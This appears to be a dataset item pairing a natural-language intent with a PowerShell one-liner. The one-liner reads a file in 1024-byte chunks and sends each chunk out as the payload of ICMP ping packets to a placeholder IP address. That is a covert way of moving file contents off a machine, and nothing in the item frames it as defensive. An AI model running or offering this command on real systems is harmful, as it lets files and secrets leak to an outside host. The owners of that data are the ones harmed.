# Natural language intent:
# Uses ping to send data to a specified IP address using content from a file.

$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("${ip_address}", 1500, $Data) }
